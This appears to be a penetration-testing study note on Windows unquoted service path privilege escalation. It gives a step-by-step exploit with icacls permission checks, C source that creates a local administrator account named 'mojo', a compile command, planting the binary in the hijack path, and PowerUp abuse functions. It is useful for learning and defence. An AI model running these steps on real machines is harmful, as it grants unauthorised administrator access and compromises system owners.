# Unquoted Service Path

## Fundamentals

In an example where a service is running with the path

```
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

This can be exploited by placing a maclicious binary in one of the misinterpreted paths

## Exploitation

We can check our permissions at each point and check if we have write permissions

```powershell
icacls "C:\"
# no write permissions
icacls "C:\Program Files"
# no write permissions
icacls "C:\Program Files\Enterprise Apps"
# write permissions located!
```

After discovering that we have write permissions for the folder `C:\Program Files\Enterprise Apps`, we can use the following `adduser.exe` program to take advantage of the vulnerability

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user mojo password123! /add");
  i = system ("net localgroup administrators mojo /add");
  
  return 0;
}
```

Compilation

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
cp .\adduser.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Restart-Service GammaService
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```

We can also use PowerUp to check and exploit

```powershell
. .\PowerUp.ps1
Get-UnquotedService
# C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe is visible
```

PowerUp also gives us the `AbuseFunction`

```powershell
Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
```

We can now exploit and verify

```powershell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```
